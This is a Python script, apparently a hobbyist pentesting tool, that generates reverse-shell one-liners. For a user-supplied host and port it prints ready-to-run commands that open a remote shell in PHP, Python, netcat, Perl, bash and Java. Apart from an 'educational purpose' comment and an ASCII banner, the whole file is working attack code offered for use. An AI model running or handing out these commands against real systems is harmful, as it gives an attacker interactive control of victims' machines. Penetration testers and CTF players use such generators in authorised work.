#!/usr/bin/env python3
#This script be made whith EDUCATIONAL PURPOSE only

__author__ = 'n0obit4'
__version__ = 'v1.0'
__Github__ = 'https://github.com/n0obit4'

import argparse
import os
from colorama import Fore

palabra = argparse.ArgumentParser(

description='Programs to make reverse shells ψ(｀∇´)ψ',
epilog='python3 %s --php -H 127.0.0.1 -p 4444\n' %os.path.basename(__file__))

#parametros de reverse shell
palabra.add_argument('--php' , help="php reverse shell", action="store_true")
palabra.add_argument('--python', help="python reverse shell", action="store_true")
palabra.add_argument('--netcat', help='netcat reverse shell', action="store_true")
palabra.add_argument('--nc', help='netcat short reverse shell', action="store_true")
palabra.add_argument('--perl', help="perl reverse shell", action="store_true")
palabra.add_argument('--bash', help="bash reverse shell", action="store_true")
palabra.add_argument('--java', help="Java reverse shell", action="store_true")
#parametros de host y puerto, son obligatorios
palabra.add_argument('-H', '--host', help="Host a escucha", required="True")
palabra.add_argument('-p', '--port', help="Puerto a escucha", required="True")

args = palabra.parse_args()

#banner
def menu():
    print(Fore.RED + '''
 ██▀███   ██▒   █▓  ██████      ██████  ██░ ██ ▓█████  ██▓     ██▓
▓██ ▒ ██▒▓██░   █▒▒██    ▒    ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒
▓██ ░▄█ ▒ ▓██  █▒░░ ▓██▄      ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░
▒██▀▀█▄    ▒██ █░░  ▒   ██▒     ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░
░██▓ ▒██▒   ▒▀█░  ▒██████▒▒   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░ ▒▓ ░▒▓░   ░ ▐░  ▒ ▒▓▒ ▒ ░   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
  ░▒ ░ ▒░   ░ ░░  ░ ░▒  ░ ░   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
  ░░   ░      ░░  ░  ░  ░     ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░
   ░           ░        ░           ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
              ░
    ''' + Fore.RESET)
    print(Fore.YELLOW + "{:45}By: {} {}\n".format('',__author__,__version__) + Fore.RESET)
menu()
#seleccionando el tipo de shell
d = " "
if args.php:
    print ('''
php -r \x27$sock=fsockopen(\x22%s\x22,%s);exec(\x22/bin/sh -i <&3 >&3 2>&3\x22);\x27
    ''' %(args.host, args.port))
elif args.python:
    print ('''
python -c \x27import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\x22%s\x22,%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\x22/bin/sh\x22,\x22-i\x22]);\x27
    ''' %(args.host, args.port))
elif args.netcat:
    print ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f' %(args.host, args.port))
elif args.nc:
    #otra forma de expresar los argumentos
    print (f'nc -e /bin/sh {args.host} {args.port}')
elif args.perl:
    print('''
perl -e \x27use Socket;$i=\x22%s\x22;$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\x22tcp\x22));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\x22>&S\x22);open(STDOUT,\x22>&S\x22);open(STDERR,\x22>&S\x22);exec(\x22/bin/sh -i\x22);};\x27
    ''' %(args.host, args.port))
elif args.bash:
    print (f'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1')
elif args.java:
    print ("r = Runtime.getRuntime()")
    print ('''
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    ''' %(args.host, args.port))
    print ("p.waitFor()")
else:
    print ("Introduce un tipo de shell.Ej: (--php, --python, etc...)\n")
    print ('Example: \n')
    print ('python3 ', os.path.basename(__file__), '--php -H 127.0.0.1 -p 4444\n')
